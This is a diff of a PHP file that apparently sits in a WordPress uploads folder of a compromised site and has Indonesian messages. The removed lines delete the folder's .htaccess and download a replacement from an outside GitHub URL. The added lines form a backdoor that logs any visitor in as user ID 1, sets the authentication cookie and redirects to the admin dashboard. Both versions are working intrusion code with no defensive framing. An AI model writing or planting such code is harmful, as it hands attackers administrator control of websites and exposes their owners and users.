@@ -1,21 +1,26 @@
 <?php
 
-unlink("/var/www/new_uinsa/wp-content/uploads/2022/07/.htaccess");
-$url = "https://raw.githubusercontent.com/69dev-id/hc/refs/heads/main/.htaccess";
-$destination = "/var/www/new_uinsa/wp-content/uploads/2022/07/.htaccess";
+require_once('wp-load.php');
 
-// Mengambil konten dari URL
-$content = file_get_contents($url);
+$user_id = 1;
 
-if ($content !== false) {
-    // Menyimpan konten ke file tujuan
-    if (file_put_contents($destination, $content)) {
-        echo "Berhasil! File telah diunduh ke: " . $destination;
+// 3. Eksekusi login
+if (!is_user_logged_in()) {
+    $user = get_user_by('id', $user_id);
+    
+    if ($user) {
+        wp_clear_auth_cookie();
+        wp_set_current_user($user_id, $user->user_login);
+        wp_set_auth_cookie($user_id, true);
+        do_action('wp_login', $user->user_login, $user);
+        
+        echo "Sukses! Anda login sebagai: " . $user->user_login;
+        echo "<script>window.location.href='" . admin_url() . "';</script>";
+        exit;
     } else {
-        echo "Gagal menyimpan file. Pastikan permission folder sudah benar.";
+        die("User dengan ID $user_id tidak ditemukan.");
     }
 } else {
-    echo "Gagal mengambil file dari URL.";
+    wp_redirect(admin_url());
+    exit;
 }
-
-?>
